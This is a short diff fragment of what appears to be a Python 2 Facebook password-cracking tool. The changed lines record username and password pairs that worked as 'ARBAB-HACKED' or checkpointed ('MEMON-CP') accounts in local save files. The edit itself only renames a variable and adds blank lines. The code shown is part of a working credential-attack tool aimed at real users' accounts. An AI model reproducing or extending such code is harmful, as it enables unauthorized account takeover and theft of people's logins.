@@ -242,15 +242,23 @@ def action():
 					if 'access_token' in q:
 						print '\x1b[1;92mARBAB-HACKED]\x1b[0m ' + k + c + Pakistan + ' | ' + pass2+'\n'+"\n"
 						okb = open('save/successfull.txt', 'a')
-						okb.write(k+c+Pakistan+'|'+pass2+'\n')
+						okb.write(k+c+user+'|'+pass2+'\n')
 						okb.close()
-						oks.append(c+Pakistan+pass2)
+						oks.append(c+user+pass2)
 					else:	
 						if 'www.facebook.com' in q['error_msg']:
-							print '[MEMON-CP] ' + k + c + Pakistan + ' | ' + pass2+'\n'
+							print '[MEMON-CP] ' + k + c + user + ' | ' + pass2+'\n'
 							cps = open('save/checkpoint.txt', 'a')
-							cps.write(k+c+Pakistan+'|'+pass2+'\n')
+							cps.write(k+c+user+'|'+pass2+'\n')
 							cps.close()
-							cpb.append(c+Pakistan+pass2)
+							cpb.append(c+user+pass2)
 							
-						
+							
+							
+							
+							
+							
+							
+							
+							
+							
